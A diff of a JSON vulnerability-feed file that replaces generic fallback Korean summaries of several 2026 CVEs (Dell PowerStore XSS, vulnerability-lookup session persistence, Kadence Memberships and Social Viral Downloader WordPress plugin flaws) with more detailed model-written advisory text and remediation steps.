       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-63672",
@@ -5877,10 +6283,10 @@
     },
     {
       "cve_id": "CVE-2026-107520",
-      "title_ko": "Dell PowerStore 500T XSS 취약점",
-      "summary_ko": "CVE-2026-107520는 Dell PowerStore 500T에서 확인된 XSS 취약점입니다. CVSS 5.4점(보통)으로 평가됐습니다.",
-      "impact_ko": "로그인 사용자의 세션을 탈취하거나 악성 스크립트를 실행시켜 관리자 권한을 노릴 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 5.1.0.0-2798105 미만 버전이며, 자산 목록과 대조해 5.1.0.0-2798105 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Dell PowerStore 저장형 XSS 취약점",
+      "summary_ko": "Dell PowerStore에 저장형 크로스사이트 스크립팅(XSS) 취약점이 있습니다. 낮은 권한의 인증된 공격자가 이를 악용하면 더 높은 권한을 가진 사용자의 세션에서 악성 스크립트가 실행될 가능성이 있습니다. 영향 버전은 Dell PowerStore 500T, 1000T, 1200T, 3000T의 제시된 버전 조건이며 CVSS 5.4 MEDIUM, CWE-79입니다.",
+      "impact_ko": "공격 성공 시 더 높은 권한을 가진 사용자의 세션에서 악성 스크립트가 실행될 가능성이 있습니다.",
+      "remediation_ko": "① 해당 PowerStore 모델·버전이 영향 조건에 해당하는지 확인하고 벤더가 안내하는 수정 버전을 적용합니다. ② 관리 콘솔 등 인터넷 노출 자산을 우선 점검합니다. ③ 인증된 사용자 권한과 세션을 보호하기 위한 접근 통제·세션 보호 조치를 검토합니다.",
       "cvss_score": 5.4,
       "severity": "MEDIUM",
       "epss_score": null,
@@ -5914,14 +6320,14 @@
       "description_orig": "Dell PowerStore contains a stored cross-site scripting (XSS) vulnerability. A low-privileged authenticated attacker could exploit this vulnerability, potentially leading to execution of malicious script in a higher-privileged user's session.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129706",
-      "title_ko": "vulnerability-lookup XSS 취약점",
-      "summary_ko": "CVE-2026-129706는 vulnerability-lookup에서 확인된 XSS 취약점입니다. CVSS 5.3점(보통)으로 평가됐습니다.",
-      "impact_ko": "로그인 사용자의 세션을 탈취하거나 악성 스크립트를 실행시켜 관리자 권한을 노릴 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "vulnerability-lookup 세션 고정 취약점",
+      "summary_ko": "vulnerability-lookup의 Flask-Login 세션 식별자가 User.get_id()에서 반환되는 단순 숫자 사용자 ID로 설정되었습니다. 이 값은 사용자 자격 증명과 연동되지 않아 비밀번호 변경, 계정 복구, 관리자 재설정 후에도 무기한 유효할 수 있습니다. XSS, 세션 하이재킹, 유출된 피드·API 키 등으로 유효 세션을 얻은 공격자는 비밀번호 변경 후에도 계정 접근을 유지할 수 있습니다.",
+      "impact_ko": "공격 성공 시 계정 접근이 지속적으로 유지되어 권한 탈취와 데이터 노출 위험이 커집니다.",
+      "remediation_ko": "① 벤더 권고 확인 후 세션 관리 수정 버전 적용 ② 비밀번호·자격 증명 변경 시 기존 세션 무효화 및 전체 로그아웃 강제 ③ 세션 ID를 자격 증명 연동 방식으로 재설계하고 인터넷 노출 자산의 세션·키 노출 모니터링 강화",
       "cvss_score": 5.3,
       "severity": "MEDIUM",
       "epss_score": null,
@@ -5950,7 +6356,7 @@
       "description_orig": "In the vulnerability-lookup web application, the Flask-Login session identifier was set to the bare numeric user ID (User.get_id() returned self.id). Because the session ID contained no component derived from the user's credential, it remained valid indefinitely regardless of any subsequent password change, account recovery, or administrator-initiated password reset. An attacker who had obtained a valid session for a user account (for example through cross-site scripting, session hijacking, or a previously exposed feed or API key) could continue to access that user's account after the user changed their password, because the session cookie still carried the same static user ID and the user_loader accepted it without any credential-bound validation. The affected component is the session management layer of the vulnerability-lookup Flask application, specifically the User.get_id() method in website/models/user.py and the load_user callback in website/web/views/session_mgmt.py. The vulnerability required that an attacker already possessed a valid session for the target user; no additional authentication or special deployment configuration was needed beyond a standard deployment of the application. The security impact is that a user cannot effectively revoke an attacker's access by changing their password, performing an account recovery, or having an administrator reset the credential. The attacker retains full authenticated access to the user's profile, subscriptions, and any role-gated functionality for the lifetime of the session cookie. Additionally, sessions that were opened via a feed key or API key before a prior fix (commit 3605d5b6) also persisted indefinitely.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130079",
@@ -6002,10 +6408,10 @@
     },
     {
       "cve_id": "CVE-2026-114453",
-      "title_ko": "Kadence Memberships 보안 취약점",
-      "summary_ko": "CVE-2026-114453는 Kadence Memberships에서 확인된 보안 취약점입니다. CVSS 3.7점(낮음)으로 평가됐습니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 4.0.6 미만 버전이며, 자산 목록과 대조해 4.0.6 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Kadence Memberships 멤버십 갱신 검증 누락 취약점",
+      "summary_ko": "Kadence Memberships 4.0.6 이전 버전은 멤버십 갱신 요청에서 제출된 멤버십 등급이 실제 갱신 중인 등급과 일치하는지 검증하지 않는다. 갱신 가격은 제출된 등급을 기준으로 산정하면서 멤버십은 다른 등급으로 활성화할 수 있어, 무료 등급을 함께 제공하는 사이트에서는 비인증 사용자가 유료 멤버십을 결제 없이 활성화할 수 있다. 따라서 권한과 과금 상태가 불일치할 수 있으며, 인증되지 않은 요청으로 발생할 수 있다.",
+      "impact_ko": "공격 성공 시 비인증 사용자가 유료 멤버십 권한을 획득해 제한된 콘텐츠나 기능에 접근할 수 있고, 사이트의 멤버십 과금·권한 관리 신뢰성이 훼손될 수 있다.",
+      "remediation_ko": "① Kadence Memberships를 4.0.6 이상으로 업데이트하고, ② 멤버십 갱신·등급 변경 로직에서 제출 등급과 실제 갱신 등급 일치 및 결제·권한 상태를 확인하며, ③ 인터넷에 노출된 WordPress 사이트와 멤버십 플러그인 사용 여부를 우선 점검한다.",
       "cvss_score": 3.7,
       "severity": "LOW",
       "epss_score": null,
@@ -6032,7 +6438,7 @@
       "description_orig": "The Kadence Memberships WordPress plugin before 4.0.6 does not check that the membership level submitted when renewing a membership matches the level being renewed, pricing the renewal from the submitted level while activating the membership at its own level, allowing unauthenticated users to activate a paid membership without paying on sites that also offer a free level.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-130335",
@@ -6084,10 +6490,10 @@
     },
     {
       "cve_id": "CVE-2026-121786",
-      "title_ko": "Social Viral Downloader 보안 취약점",
-      "summary_ko": "CVE-2026-121786는 Social Viral Downloader에서 확인된 보안 취약점입니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Social Viral Downloader 로그 내보내기 접근통제 누락 취약점",
+      "summary_ko": "Social Viral Downloader 2.0.3까지는 로그 내보내기 작업에 authorization 또는 nonce 검사가 없다. 이 누락으로 비인증 사용자가 다운로드 로그를 공개적으로 접근 가능한 파일로 내보낼 수 있으며, 내보낸 파일은 외부에서 열람될 가능성이 있다. 해당 로그에는 등록된 사용자의 이메일 주소와 IP 주소가 포함될 수 있다.",
+      "impact_ko": "공격 성공 시 등록된 사용자의 이메일 주소와 IP 주소 등 개인정보가 공개된 파일로 노출될 수 있다.",
+      "remediation_ko": "① Social Viral Downloader의 최신 보안 패치 여부를 제조사에 확인해 적용하고, ② 로그 내보내기 작업에 인증·권한·nonce 검사를 부여하며, ③ 공개 파일 생성 경로를 차단하고 인터넷 노출 자산을 우선 점검한다.",
       "cvss_score": null,
       "severity": "UNKNOWN",
       "epss_score": null,
@@ -6114,7 +6520,7 @@
       "description_orig": "The Social Viral Downloader WordPress plugin through 2.0.3 does not have authorisation or nonce checks on a log export action available to unauthenticated users, which could allow them to export the download log, including registered users' email addresses and IP addresses, to a publicly accessible file.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-16 20:37:33 KST",
-      "analyzed_by": "fallback"
+      "analyzed_by": "exaone"
     }
   ]
 }
